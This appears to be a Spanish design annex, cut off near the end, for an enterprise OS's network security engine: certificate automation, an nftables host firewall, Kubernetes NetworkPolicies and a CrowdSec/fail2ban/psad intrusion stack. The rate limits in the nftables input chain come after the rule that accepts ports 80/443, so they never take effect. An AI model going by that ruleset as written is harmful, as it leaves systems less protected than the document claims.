# Anexo A.15 — Network Security Manager (NetMan)
## Firewall · Certificados · Puertos · IPS · Zero Trust — Motor Unificado de Seguridad de Red

**Versión:** 1.0.0  
**Fecha:** 2026-07-31  
**Autor:** bos-developer — SBOS  
**Fortalece al motor:** ③ Server FICHAS + ① IAM Installer  
**Normas:** NIST SP 800-207 (ZTA) · NIST SP 800-41 · ISO 27001:2022 A.8.20/A.8.21/A.8.24 · CIS K8s Benchmark v1.10 · RFC 6335 · RFC 8555 (ACME)  
**Precede a:** [A.12 — Port Manager Kardex](A.12_ANEXO-PORT-MANAGER-KARDEX.md) (subsistema incluido)

---

## 0. Por qué un motor unificado

Un sistema operativo empresarial soberano que no controla su red no es soberano.

La industria aprendió — con incidentes como SolarWinds (2020), Log4Shell (2021), y MOVEit (2023) — que la seguridad perimetral por sí sola no basta. El modelo moderno es **Zero Trust + Defense in Depth**: verificar todo, confiar en nada, segmentar agresivamente, renovar credenciales automáticamente.

SBOS aplica estos principios sin fricciones. El operador no configura reglas de firewall, no emite certificados, no mantiene listas de puertos. **El Network Security Manager lo hace automáticamente**, derivando toda la configuración de seguridad de las fichas declarativas.

### 0.1 Los cuatro motores del NetMan

```
┌─────────────────────────────────────────────────────────────────┐
│           NETWORK SECURITY MANAGER — bos.netman.*               │
│                                                                   │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────┐ │
│  │  PORTMAN     │  │  CERTMAN     │  │  FWMAN       │  │  IPS │ │
│  │  bos.portman │  │  bos.certman │  │  bos.fwman   │  │      │ │
│  │              │  │              │  │              │  │      │ │
│  │ • RFC 6335   │  │ • Vault PKI  │  │ • nftables   │  │ CWD  │ │
│  │ • Algoritmo A│  │ • cert-mgr   │  │ • NetPolicy  │  │ F2B  │ │
│  │ • Algoritmo B│  │ • SPIFFE/    │  │ • WireGuard  │  │ psad │ │
│  │ • Kardex T408│  │   SPIRE      │  │ • DDoS rules │  │      │ │
│  │ • 7 métodos  │  │ • Kardex T413│  │ • SYNPROXY   │  │      │ │
│  └──────────────┘  └──────────────┘  └──────────────┘  └──────┘ │
│                                                                   │
│  Fuente de verdad: fichas declarativas (manifest.yml)            │
│  Principio: seguridad derivada, nunca configurada manualmente    │
└─────────────────────────────────────────────────────────────────┘
```

---

## 1. PORTMAN — Motor de Puertos (ya implementado)

El portman está implementado en `internal/portman/` (commit `380cd69`).  
Ver diseño completo en [A.12 — Port Manager Kardex](A.12_ANEXO-PORT-MANAGER-KARDEX.md).

**Resumen de lo implementado:**
- Algoritmo A: `BASE_SERVIDOR + (FICHA_INDEX × 10) + TIPO_T`
- Algoritmo B: SHA-256 hash fallback, rango 32000-49151
- Resolución N1→N2→N3→HITL
- Verificación 3 capas: blacklist IANA/K8s → SBOS-050 → Kardex T-408
- 7 métodos JSON-RPC: `bos.portman.assign/lookup/release/check/list/validate/export`
- CLI: `bosctl port lookup/list/check/assign/release/validate/export`

**Integración pendiente:**
- Wire en `bos.ficha.install` → `portman.Assign()`
- Wire en `bos.ficha.remove` → `portman.Release()`
- Wire en `reconcile/scheduler.go` → `portman.ValidateKardex()` cada 300s

---

## 2. CERTMAN — Motor de Certificados TLS

### 2.1 El problema de los certificados en SBOS

Un entorno SBOS completo tiene **80+ certificados activos simultáneamente**:

| Ámbito | Cantidad | Tipo | Renovación |
|--------|----------|------|-----------|
| Daemons SBOS en host (bos, bauth, bkernel...) | 7 | X.509 ECDSA P-256 | Automática (Vault agent) |
| Servicios K8s por ficha (1-3 por ficha) | ~50 | X.509 TLS | cert-manager |
| mTLS entre pods (SPIFFE SVIDs) | ~120 | SVID X.509 (24h) | SPIRE automático |
| Wildcard externo (*.empresa.sbos.app) | 1 | X.509 DV | Let's Encrypt / ACME |
| Certificado Kong (TLS termination) | 1 | X.509 | ACME / Vault |
| CA interna SBOS | 3 | CA Root + 2 Intermediate | Manual/HITL (5 años) |

Sin automatización, la caducidad de un solo certificado puede provocar una interrupción total del servicio. Con automatización, el operador nunca ve un certificado.

### 2.2 Jerarquía de CAs en SBOS

```
SBOS Root CA (offline, 10 años, ECDSA P-384)
   │
   ├── SBOS Intermediate CA — Daemons (3 años, ECDSA P-256)
   │     └── Vault PKI Engine (emite certs de daemons SBOS, 90 días)
   │           ├── bos.service      /etc/bos/tls/bos.{crt,key}
   │           ├── bauth.service    /etc/bauth/tls/bauth.{crt,key}
   │           ├── bkernel.service  /etc/bkernel/tls/...
   │           └── ... (7 daemons SBOS)
   │
   └── SBOS Intermediate CA — Workloads (3 años, ECDSA P-256)
         └── cert-manager ClusterIssuer (emite certs de fichas, 90 días)
               ├── Certificate: keycloak.sbos-identity.svc
               ├── Certificate: postgresql.sbos-data.svc
               └── ... (1 cert por ficha que expone TLS)
         
         └── SPIRE Server (emite SVIDs para mTLS entre pods, 24h)
               ├── SVID: spiffe://sbos.cluster/ns/sbos-identity/sa/keycloak
               ├── SVID: spiffe://sbos.cluster/ns/sbos-data/sa/postgresql
               └── ... (1 SVID por ServiceAccount)
```

### 2.3 Herramientas del stack (estándar industria 2025-2026)

| Herramienta | Rol | Por qué |
|-------------|-----|---------|
| **Vault PKI** | CA interna + emisión de certs para daemons host | Ya está en el stack SBOS (Vault 2.0.1). PKI engine nativo, renovación automática vía Vault Agent |
| **cert-manager** | Gestión de certs en K8s (CNCF Graduated) | Estándar de facto para K8s. Integra con Vault como Issuer. Auto-renueva al 60% del lifetime |
| **SPIFFE/SPIRE** | Identidad de workload para mTLS automático | Identidad criptográfica por ServiceAccount. Linkerd y Cilium pueden usar SPIRE como CA |
| **acme.sh** | Certificados externos (Let's Encrypt / ACME) | Cliente ACME liviano. Integrable con Vault para almacenamiento centralizado |
| **Vault Agent** | Renovación automática en el host | Sidecar/daemon que monitorea TTL de certs y los renueva antes de expirar |

### 2.4 Certificados de daemons en el host

Los 7 daemons SBOS corren en el host (no en pods). Sus certificados siguen un patrón uniforme:

```
/etc/bos/
├── tls/
│   ├── bos.crt          # cert TLS del daemon bos (9443)
│   ├── bos.key          # clave privada
│   └── ca-bundle.crt    # CA interna SBOS (para verificar otros daemons)
└── ...

/etc/bauth/tls/bauth.{crt,key}
/etc/bkernel/tls/bkernel.{crt,key}
# ... (mismo patrón para cada daemon)
```

**Flujo de emisión (Vault PKI + Vault Agent):**

```
1. Vault PKI engine configurado con CA SBOS Intermediate — Daemons
2. Vault Agent en el host monitorea TTL de cada cert (/etc/<daemon>/tls/)
3. Cuando TTL < 30% → Vault Agent solicita renovación a Vault PKI
4. Vault emite nuevo cert (ECDSA P-256, 90 días, SAN = daemon.sbos.local)
5. Vault Agent escribe el cert en /etc/<daemon>/tls/ y envía SIGHUP al daemon
6. El daemon recarga TLS sin restart (hot-reload)
7. Evento registrado en Kardex de Certificados (T-413)
```

### 2.5 Certificados de fichas en K8s (cert-manager)

**Patrón por ficha:**

```yaml
# Generado automáticamente por portman.Assign() durante bos.ficha.install
apiVersion: cert-manager.io/v1
kind: Certificate
metadata:
  name: sbos-keycloak-tls
  namespace: sbos-identity
spec:
  secretName: keycloak-tls-secret
  duration: 2160h    # 90 días
  renewBefore: 720h  # renovar 30 días antes
  issuerRef:
    name: sbos-vault-issuer
    kind: ClusterIssuer
  dnsNames:
  - keycloak.sbos-identity.svc.cluster.local
  - keycloak.sbos-identity.svc
  - keycloak
  - auth.empresa.sbos.app   # si está expuesto externamente
  privateKey:
    algorithm: ECDSA
    size: 256
```

**cert-manager ClusterIssuer con Vault:**

```yaml
apiVersion: cert-manager.io/v1
kind: ClusterIssuer
metadata:
  name: sbos-vault-issuer
spec:
  vault:
    path: pki_workloads/sign/sbos-fichas
    server: https://vault.sbos-infra.svc.cluster.local:8200
    caBundle: <base64 CA SBOS>  # CA bundle para verificar Vault
    auth:
      kubernetes:
        role: cert-manager
        mountPath: /v1/auth/kubernetes
```

### 2.6 mTLS con SPIFFE/SPIRE (identidad de workload)

Para comunicación pod-a-pod con mTLS automático (Zero Trust):

```
SPIRE Server (DaemonSet en K8s)
   │
   ├── Emite SVID a cada workload basándose en ServiceAccount + namespace
   │   SVID = X.509 cert de 24 horas (auto-renovado cada 12h)
   │   Subject: spiffe://sbos.cluster/ns/sbos-identity/sa/keycloak
   │
   └── Linkerd/Cilium usan SPIRE como fuente de certificados
       → mTLS automático sin configuración por pod
```

### 2.7 Kardex de Certificados (T-413)

```sql
-- T-413: bos.net_cert_inventory — Kardex de certificados TLS
-- Convención de nombres DDL: grupo NET → prefijo net_ (igual que bos.net_security_events T-414)
CREATE TABLE IF NOT EXISTS bos.net_cert_inventory (
    cert_id            UUID         NOT NULL DEFAULT uuidv7(),

    -- Identidad del certificado
    subject_cn         TEXT         NOT NULL,           -- "keycloak.sbos-identity.svc"
    subject_san        TEXT[]       NOT NULL DEFAULT '{}',-- ["keycloak", "auth.empresa.sbos.app"]
    issuer             TEXT         NOT NULL,           -- "SBOS Intermediate CA — Workloads"
    serial_number      TEXT         NULL,               -- número de serie RFC 5280 §4.1.2.2 (OCSP)
    fingerprint_sha256 TEXT         NOT NULL,           -- SHA-256 DER (huella única del cert)

    -- Lifecycle
    valid_from         TIMESTAMPTZ  NOT NULL,
    valid_until        TIMESTAMPTZ  NOT NULL,
    days_remaining     INTEGER      GENERATED ALWAYS AS
                           (EXTRACT(DAY FROM (valid_until - NOW()))::INTEGER) STORED,

    -- Tipo y uso
    cert_type          TEXT         NOT NULL CHECK (cert_type IN (
                           'daemon_host',       -- bos, bauth, bkernel...
                           'ficha_k8s',         -- cert de ficha en K8s (cert-manager)
                           'spiffe_svid',       -- identidad de workload mTLS (SPIRE 24h)
                           'external_wildcard', -- *.empresa.sbos.app (Let's Encrypt)
                           'kong_tls',          -- TLS Kong Gateway (terminación TLS)
                           'ca_internal'        -- CA raíz o intermedia SBOS
                       )),
    key_algorithm      TEXT         NOT NULL DEFAULT 'ECDSA',
    key_size           SMALLINT     NOT NULL DEFAULT 256,

    -- Vínculo con el activo
    service_name       TEXT         NULL,               -- nombre del servicio/ficha/daemon
    namespace          TEXT         NULL,               -- namespace K8s (NULL para host)
    ficha_id           TEXT         NULL,               -- ficha responsable si aplica
    secret_name        TEXT         NULL,               -- Secret K8s que contiene el cert
    host_path          TEXT         NULL,               -- /etc/bos/tls/bos.crt si es host

    -- Gestión de emisión y renovación
    issuer_engine      TEXT         NOT NULL CHECK (issuer_engine IN (
                           'vault_pki',    -- Vault PKI secrets engine
                           'cert_manager', -- cert-manager ClusterIssuer
                           'spire',        -- SPIFFE/SPIRE
                           'acme_le',      -- Let's Encrypt vía ACME
                           'manual'        -- Manual (solo CA raíz)
                       )),
    auto_renew         BOOLEAN      NOT NULL DEFAULT TRUE,
    renew_before_days  SMALLINT     NOT NULL DEFAULT 30,

    -- Estado
    status             TEXT         NOT NULL DEFAULT 'active' CHECK (status IN (
                           'active',           -- en uso
                           'expiring_soon',    -- days_remaining < renew_before_days
                           'expired',          -- caducado
                           'revoked',          -- revocado por Vault/OCSP
                           'superseded'        -- reemplazado por renovación
                       )),

    -- Audit trail
    issued_at          TIMESTAMPTZ  NOT NULL DEFAULT NOW(), -- cuándo fue emitido
    revoked_at         TIMESTAMPTZ  NULL,
    last_renewed_at    TIMESTAMPTZ  NULL,                   -- última renovación exitosa
    last_checked_at    TIMESTAMPTZ  NULL,
    ctx_id             TEXT         NOT NULL DEFAULT 'system',

    CONSTRAINT net_ci_pkey              PRIMARY KEY (cert_id),
    CONSTRAINT uq_net_ci_fingerprint    UNIQUE (fingerprint_sha256),
    CONSTRAINT chk_net_ci_validity      CHECK (valid_until > valid_from),
    CONSTRAINT chk_net_ci_revoke_state  CHECK (
        (status = 'revoked' AND revoked_at IS NOT NULL) OR
        (status != 'revoked' AND revoked_at IS NULL)
    )
);

CREATE INDEX IF NOT EXISTS idx_net_ci_expiry    ON bos.net_cert_inventory(valid_until) WHERE status = 'active';
CREATE INDEX IF NOT EXISTS idx_net_ci_ficha     ON bos.net_cert_inventory(ficha_id);
CREATE INDEX IF NOT EXISTS idx_net_ci_cert_type ON bos.net_cert_inventory(cert_type);
CREATE INDEX IF NOT EXISTS idx_net_ci_expiring  ON bos.net_cert_inventory(days_remaining) WHERE status = 'active';
```

### 2.8 API JSON-RPC — `bos.certman.*`

| Método | Quién lo llama | Qué hace |
|--------|---------------|----------|
| `bos.certman.issue` | `bos.ficha.install` | Emite cert para una ficha vía cert-manager/Vault. Registra en T-413 |
| `bos.certman.revoke` | `bos.ficha.remove` | Revoca cert en Vault. Transiciona T-413 a 'revoked' |
| `bos.certman.renew` | `bos.certman.watch` | Renueva cert próximo a expirar. Idempotente |
| `bos.certman.status` | `bosctl cert status` | Estado de cert de una ficha/daemon |
| `bos.certman.list` | `bosctl cert list` | Kardex de Certificados con filtros |
| `bos.certman.watch` | `reconcile/scheduler.go` | Detecta certs próximos a expirar (< renew_before_days) y dispara renovación |
| `bos.certman.rotate_ca` | HITL only | Rotación de CA interna (operación de alto impacto) |
| `bos.certman.export` | `bosctl cert export` | Exporta inventario en Markdown (ISO 27001 A.8.24) |

### 2.9 CLI — `bosctl cert`

```bash
bosctl cert list                              # Listar todos los certificados con estado
bosctl cert list --expiring-in 30             # Certs que expiran en 30 días
bosctl cert list --ficha keycloak             # Certs de una ficha específica
bosctl cert status --ficha keycloak           # Estado detallado
bosctl cert renew --ficha keycloak            # Forzar renovación anticipada
bosctl cert export                            # Kardex en Markdown (ISO 27001 A.8.24)
```

---

## 3. FWMAN — Motor de Firewall y Políticas de Red

### 3.1 Dos capas de firewall en SBOS

SBOS implementa defensa en profundidad con dos capas complementarias:

```
┌─────────────────────────────────────────────────────────────────┐
│  CAPA 1 — HOST FIREWALL (nftables)                              │
│  Controla: tráfico que entra/sale del servidor físico           │
│  Motor: nftables (Linux kernel, GA en K8s 1.33+)               │
│  Gestión: bos.fwman.host.*                                      │
│                                                                   │
│  REGLAS BASE (deny-all, allows explícitos):                      │
│  • ACCEPT: 51820/UDP (WireGuard admin)                          │
│  • ACCEPT: 443/TCP (Kong HTTPS)                                  │
│  • ACCEPT: 80/TCP (Kong HTTP → redirect 443)                     │
│  • ACCEPT: established, related (stateful)                       │
│  • DROP: todo lo demás (incluyendo 22/SSH desde internet)        │
│                                                                   │
│  PROTECCIÓN ACTIVA:                                              │
│  • SYNPROXY (SYN flood)                                          │
│  • Rate limiting por IP (100 conn/s)                             │
│  • TCP flags inválidos → DROP inmediato                          │
│  • Bogon filter (IPs privadas como fuente)                       │
│  • CrowdSec bouncer (blocklist comunitaria dinámica)             │
└──────────────────────┬──────────────────────────────────────────┘
                       │ tráfico pasa al cluster K8s
┌──────────────────────▼──────────────────────────────────────────┐
│  CAPA 2 — POD FIREWALL (K8s NetworkPolicy + Calico/Cilium)      │
│  Controla: tráfico entre pods, entre namespaces                  │
│  Motor: Calico nftables dataplane o Cilium eBPF                  │
│  Gestión: bos.fwman.policy.*                                     │
│                                                                   │
│  MICROSEGMENTACIÓN POR ZONA DE SEGURIDAD SBOS:                  │
│  • sbos-identity  (bauth, Keycloak)                              │
│  • sbos-data      (PostgreSQL, Redis, bkernel)                   │
│  • sbos-apps      (ERP, CRM, fichas de negocio)                  │
│  • sbos-edge      (Kong Gateway, Ingress)                        │
│  • sbos-ia        (modelos IA locales)                           │
│  • sbos-infra     (Vault, monitoring)                            │
│                                                                   │
│  REGLA BASE: deny-all en cada namespace                          │
│  + allows explícitos derivados del Kardex de Puertos            │
└─────────────────────────────────────────────────────────────────┘
```

### 3.2 Ruleset nftables base de SBOS

El Motor de Firewall genera y aplica el siguiente ruleset. No se edita manualmente.

```
# Tabla principal: inet (IPv4 + IPv6 unificados)
table inet sbos_firewall {

    # ── Conjuntos dinámicos (CrowdSec bouncer los actualiza) ────────────
    set crowdsec_blacklist {
        type ipv4_addr
        flags dynamic, timeout
        timeout 4h
    }

    set admin_whitelist {
        type ipv4_addr
        flags interval
        elements = { 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 }
        # Actualizado por bos.fwman.admin_whitelist
    }

    # ── Rate-limiting maps ───────────────────────────────────────────────
    map syn_rate {
        type ipv4_addr : verdict
        flags dynamic
        timeout 10s
        gc-interval 10s
    }

    map conn_count {
        type ipv4_addr : integer
        flags dynamic
        size 65535
    }

    # ── Chain PREROUTING (raw — antes de conntrack, para SYNPROXY) ──────
    chain prerouting_raw {
        type filter hook prerouting priority raw; policy accept;
        
        # SYNPROXY: interceptar SYN en puertos públicos antes del conntrack
        tcp dport { 80, 443 } tcp flags syn notrack
    }

    # ── Chain INPUT ──────────────────────────────────────────────────────
    chain input {
        type filter hook input priority 0; policy drop;
        
        # 1. CrowdSec blacklist — DROP inmediato
        ip saddr @crowdsec_blacklist drop
        
        # 2. Loopback
        iif lo accept
        
        # 3. Stateful (connexiones established/related)
        ct state established,related accept
        ct state invalid drop
        
        # 4. SYNPROXY: completar handshake
        tcp dport { 80, 443 } tcp flags syn ct state untracked \
            synproxy mss 1460 wscale 9 timestamp sack-perm
        tcp dport { 80, 443 } ct state invalid drop
        
        # 5. TCP flags inválidos (NULL, XMAS, SYN+FIN scans)
        tcp flags & (fin|syn|rst|psh|ack|urg) == fin|syn|rst|psh|ack|urg drop
        tcp flags & (fin|syn|rst|psh|ack|urg) == 0x0 drop
        tcp flags & (syn|fin) == syn|fin drop
        tcp flags & (syn|rst) == syn|rst drop
        
        # 6. Bogon filter
        ip saddr {
            0.0.0.0/8, 100.64.0.0/10, 127.0.0.0/8,
            169.254.0.0/16, 198.18.0.0/15, 198.51.100.0/24,
            203.0.113.0/24, 224.0.0.0/4, 240.0.0.0/4
        } drop
        
        # 7. ICMP (rate limited)
        icmp type echo-request limit rate 5/second burst 10 packets accept
        icmp type echo-request drop
        
        # 8. WireGuard (acceso admin — solo IP whitelist si se configura)
        udp dport 51820 accept
        
        # 9. Kong público (HTTP/HTTPS)
        tcp dport { 80, 443 } accept
        
        # 10. Rate limiting conexiones TCP por IP (100/s)
        tcp dport { 80, 443 } \
            meter tcp_rate { ip saddr limit rate over 100/second } \
            drop
        
        # 11. Connection count por IP (max 200 conn simultáneas)
        tcp dport { 80, 443 } \
            meter tcp_conncount { ip saddr ct count over 200 } \
            drop
        
        # 12. UDP flood
        ip protocol udp \
            meter udp_flood { ip saddr limit rate over 1000/second burst 1500 } \
            drop
        
        # [Todos los demás → DROP por policy]
    }

    # ── Chain FORWARD (tráfico K8s inter-pod) ───────────────────────────
    chain forward {
        type filter hook forward priority 0; policy accept;
        # Calico/Cilium gestionan el forward — no tocar
        # Solo añadir reglas globales aquí (ej: bloquear Inter-VPC no deseado)
    }

    # ── Chain OUTPUT ─────────────────────────────────────────────────────
    chain output {
        type filter hook output priority 0; policy accept;
        # Permitir todo el tráfico de salida (servidores PULL-only)
        # Si se requiere egress filtering, agregarlo aquí
    }
}
```

### 3.3 NetworkPolicy K8s generadas automáticamente

El Fwman genera las NetworkPolicies de K8s derivándolas del Kardex de Puertos (T-408).  
Cada vez que `bos.portman.assign` registra un puerto, `bos.fwman.policy.sync` genera la NetworkPolicy correspondiente.

**Patrón por namespace (base):**

```yaml
# Generado por bos.fwman.policy.sync — NO editar manualmente
# Fuente de verdad: Kardex T-408 + manifest.yml de la ficha

# 1. Deny-all base (siempre presente en todo namespace SBOS)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: sbos-default-deny
  namespace: sbos-identity  # se repite en cada namespace
  labels:
    sbos.io/managed-by: fwman
    sbos.io/version: "1"
spec:
  podSelector: {}
  policyTypes: [Ingress, Egress]
---
# 2. Permitir DNS (requerido siempre)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: sbos-allow-dns
  namespace: sbos-identity
spec:
  podSelector: {}
  policyTypes: [Egress]
  egress:
  - ports:
    - port: 53
      protocol: UDP
    - port: 53
      protocol: TCP
---
# 3. Permit ingress para keycloak (generado del Kardex T-408 ficha=keycloak)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: sbos-ingress-keycloak
  namespace: sbos-identity
  labels:
    sbos.io/managed-by: fwman
    sbos.io/ficha: keycloak
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: keycloak
  policyTypes: [Ingress]
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          sbos.io/zone: edge         # solo desde Kong (sbos-edge)
    ports:
    - port: 8080  # containerPort del Kardex (port_role=container)
      protocol: TCP
  - from:
    - namespaceSelector:
        matchLabels:
          sbos.io/zone: identity     # desde otros pods de identity (admin)
    ports:
    - port: 9000  # admin port (tipo_t=4)
      protocol: TCP
```

### 3.4 Microsegmentación por zona de seguridad

```
SBOS define 6 zonas de seguridad (namespaces K8s + labels):

sbos-edge (zona: edge)
  └─ Kong Gateway — único punto de entrada externo
  └─ Puede enviar a: sbos-identity, sbos-apps
  └─ No puede recibir de: nada (solo recibe de internet)

sbos-identity (zona: identity)
  └─ bauth, Keycloak
  └─ Puede enviar a: sbos-data (leer credenciales)
  └─ Puede recibir de: sbos-edge, sbos-apps (autenticación)

sbos-data (zona: data)
  └─ PostgreSQL, Redis, bkernel
  └─ No puede iniciar conexiones salientes (recibe solo)
  └─ Puede recibir de: sbos-identity, sbos-apps

sbos-apps (zona: apps)
  └─ ERP, CRM, fichas de negocio
  └─ Puede enviar a: sbos-data, sbos-identity
  └─ Puede recibir de: sbos-edge

sbos-ia (zona: ai)
  └─ Modelos IA locales
  └─ Completamente aislada de internet (air-gapped)
  └─ Solo recibe de sbos-apps (inference requests)

sbos-infra (zona: infra)
  └─ Vault, monitoring, cert-manager, SPIRE
  └─ Puede recibir de: todos los namespaces (métricas, audit, certs)
  └─ Puede enviar a: todos (PKI, secrets)

REGLA: Tráfico no especificado entre zonas → DENIED por NetworkPolicy
```

### 3.5 WireGuard para acceso administrativo

El acceso SSH y al panel admin de Kong nunca se expone directamente a internet.  
Todo acceso administrativo pasa por WireGuard:

```
nftables del host:
  ACCEPT: 51820/UDP (WireGuard VPN)
  ACCEPT: 80/443 TCP (Kong público)
  DROP: 22/TCP (SSH — solo desde interfaz WireGuard wg0)
  DROP: 8444/TCP (Kong admin — solo desde wg0)
  DROP: todo lo demás

Dentro de la VPN WireGuard (red 10.7.0.0/24):
  SSH: 10.7.0.1:22
  kubectl: 10.7.0.1:6443 (kube-apiserver)
  Kong admin: 10.7.0.1:8444
  Grafana/monitoring: 10.7.0.1:3000
```

**Patrón de WireGuard en nftables:**

```
# Solo SSH desde wg0
chain input {
    iif "wg0" tcp dport 22 accept
    iif "wg0" tcp dport 8444 accept
    iif "wg0" tcp dport 6443 accept
    tcp dport 22 drop    # desde cualquier otra interfaz → DROP
}
```

### 3.6 API JSON-RPC — `bos.fwman.*`

| Método | Quién lo llama | Qué hace |
|--------|---------------|----------|
| `bos.fwman.policy.sync` | `bos.ficha.install` automático | Genera/actualiza NetworkPolicy K8s desde Kardex T-408 |
| `bos.fwman.policy.status` | `bosctl fw policy list` | Lista NetworkPolicies activas por namespace |
| `bos.fwman.host.status` | `bosctl fw host status` | Estado del ruleset nftables del host |
| `bos.fwman.host.validate` | `reconcile/scheduler.go` | Verifica que el ruleset nftables coincide con la config canónica |
| `bos.fwman.host.reload` | HITL / operador | Recarga el ruleset nftables desde la config canónica |
| `bos.fwman.whitelist.add` | `bosctl fw whitelist add <ip>` | Agrega IP a admin_whitelist (WireGuard bypass temporal) |
| `bos.fwman.whitelist.remove` | `bosctl fw whitelist remove <ip>` | Remueve IP de admin_whitelist |
| `bos.fwman.audit` | `bosctl fw audit` | Compara ruleset actual vs canónico — detecta modificaciones manuales |

### 3.7 CLI — `bosctl fw`

```bash
bosctl fw policy list                    # NetworkPolicies activas
bosctl fw policy list --ns sbos-identity # Por namespace
bosctl fw host status                    # Estado ruleset nftables
bosctl fw host validate                  # Detectar drift en nftables
bosctl fw host reload                    # Recargar ruleset canónico
bosctl fw whitelist add 203.0.113.5      # Whitelist temporal
bosctl fw whitelist list                 # Ver whitelist activa
bosctl fw audit                          # Auditoría completa
```

---

## 4. IPS — Motor de Prevención de Intrusiones

### 4.1 Stack IPS/IDS en SBOS

```
┌─────────────────────────────────────────────────────────────────┐
│  LAYER 1 — nftables (preventivo, nanosegundos)                  │
│  • TCP flags inválidos (NULL, XMAS, SYN+FIN)                    │
│  • Rate limiting (100 conn/s por IP)                             │
│  • Bogon filter                                                  │
│  • SYNPROXY (anti-SYN-flood)                                     │
│  → Sin overhead: reglas en el kernel, antes del proceso de paquete│
└──────────────────────┬──────────────────────────────────────────┘
                       │
┌──────────────────────▼──────────────────────────────────────────┐
│  LAYER 2 — CrowdSec (behavioral, segundos)                       │
│  • Agent en el host: analiza logs nftables + Kong + SSH          │
│  • Detecta: brute force, port scan, credential stuffing,         │
│    web scraping, DDoS lento (slowloris)                          │
│  • Bouncer nftables: actualiza @crowdsec_blacklist dinámicamente │
│  • Blocklist comunitaria: ~2M IPs maliciosas conocidas           │
│  • Decision TTL: 4 horas (configurable)                          │
└──────────────────────┬──────────────────────────────────────────┘
                       │
┌──────────────────────▼──────────────────────────────────────────┐
│  LAYER 3 — fail2ban + nftables (reactivo, segundos-minutos)      │
│  • Complementa CrowdSec para patrones de log específicos de SBOS │
│  • Protege: SSH (en wg0), Kong admin (8444)                      │
│  • banaction: nftables-multiport (no iptables)                   │
│  • maxretry: 3 intentos en 10 minutos → ban 1 hora               │
└──────────────────────┬──────────────────────────────────────────┘
                       │
┌──────────────────────▼──────────────────────────────────────────┐
│  LAYER 4 — psad (detección de port scan, minutos)                │
│  • Analiza logs nftables de paquetes DROP                         │
│  • Detecta: nmap, masscan, ZGrab, patterns de scan               │
│  • Auto-bloquea IPs escaneando vía nftables                      │
│  • Registra en audit log con nivel de severidad                  │
└─────────────────────────────────────────────────────────────────┘
```

### 4.2 CrowdSec en Kubernetes

```yaml
# DaemonSet CrowdSec — lee logs del host y de pods
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: crowdsec-agent
  namespace: sbos-infra
spec:
  selector:
    matchLabels:
      app: crowdsec
  template:
    spec:
      hostPID: true          # Necesario para acceder a logs del host
      hostNetwork: true      # Necesario para leer logs de red
      volumes:
      - name: varlog
        hostPath:
          path: /var/log
      - name: nftables-log
        hostPath:
          path: /var/log/nftables/
      containers:
      - name: crowdsec-agent
        image: crowdsecurity/crowdsec:v1.6
        env:
        - name: COLLECTIONS
          value: "crowdsecurity/linux crowdsecurity/nginx crowdsecurity/ssh"
```

**Bouncers activos:**
- `crowdsec-nftables-bouncer` — actualiza `@crowdsec_blacklist` en nftables del host
- `crowdsec-kong-plugin` — bloquea en Kong antes de que llegue al cluster

### 4.3 fail2ban con nftables (configuración SBOS)

```ini
# /etc/fail2ban/jail.d/sbos.conf
[DEFAULT]
banaction = nftables-multiport
banaction_allports = nftables-allports
backend = systemd

# SSH vía WireGuard (solo en interfaz wg0)
[sshd-wireguard]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
findtime = 600
bantime = 3600

# Kong Admin API (8444)
[kong-admin]
enabled = true
port = 8444
filter = kong-admin
logpath = /var/log/kong/admin.log
maxretry = 5
findtime = 300
bantime = 7200
```

### 4.4 Logging de red (audit trail)

Todo evento de red relevante se registra en un formato estructurado centralizable con Loki:

```
# /var/log/nftables/sbos-firewall.log (via nftables LOG action)
{"ts":"2026-07-31T10:23:44Z","event":"DROP","src":"198.51.100.45","dst":"10.0.0.1","dport":22,"proto":"TCP","reason":"port_not_allowed","chain":"input"}
{"ts":"2026-07-31T10:23:45Z","event":"DROP","src":"203.0.113.7","dst":"10.0.0.1","reason":"crowdsec_blacklist","chain":"input"}
{"ts":"2026-07-31T10:23:50Z","event":"DROP","src":"192.0.2.99","reason":"tcp_flags_invalid","flags":"FIN|SYN","chain":"input"}

# Eventos mandatorios para ISO 27001 A.8.21 / NIST SP 800-41:
# - Toda conexión rechazada por firewall
# - Cambios en ruleset nftables
# - Cambios en NetworkPolicy K8s
# - Eventos CrowdSec (nueva IP baneada, desbaneo)
# - fail2ban bans/unbans
# - Port scan detections (psad)
```

### 4.5 API JSON-RPC — `bos.ips.*`

| Método | Quién lo llama | Qué hace |
|--------|---------------|----------|
| `bos.ips.status` | `bosctl ips status` | Estado de CrowdSec, fail2ban, psad |
| `bos.ips.blacklist.list` | `bosctl ips blocked` | IPs bloqueadas actualmente con TTL restante |
| `bos.ips.blacklist.unblock` | HITL operador | Desbloquear una IP específica |
| `bos.ips.alerts` | `bosctl ips alerts` | Últimas alertas IPS con severidad |

### 4.6 CLI — `bosctl ips`

```bash
bosctl ips status                            # Estado del stack IPS
bosctl ips blocked                           # IPs bloqueadas en este momento
bosctl ips blocked --source crowdsec         # Solo bloqueos de CrowdSec
bosctl ips blocked --source fail2ban         # Solo bloqueos de fail2ban
bosctl ips unblock 203.0.113.5               # Desbloquear IP (HITL)
bosctl ips alerts --last 24h                 # Alertas últimas 24h
bosctl ips alerts --severity high            # Solo alertas críticas
```

---

## 5. Protección de las Vías de Ingreso BOS (L7)

Los motores anteriores (FWMAN, IPS) protegen el perímetro de red externo y el tráfico entre pods.
Esta sección cubre el **perímetro propio del daemon BOS**: las APIs que expone a sus callers.
Si un atacante escala privilegios en el host o compromete un daemon hermano, las defensas de red no aplican — las vías de ingreso del propio daemon son la última barrera.

### 5.1 Las 4 superficies de ataque del daemon BOS

```
┌─────────────────────────────────────────────────────────────────────────┐
│ SUPERFICIES DE ATAQUE PROPIAS DEL DAEMON BOS                            │
│                                                                         │
│  SUP-1: /run/bos/bos.sock                                              │
│    permisos SO: 0660, grupo bosagent                                    │
│    protocolo: WebSocket RPC (bosctl/UI) + JSON-RPC 2.0 (daemons/IA)   │
│    amenazas: privilege escalation local · replay · message bomb ·       │
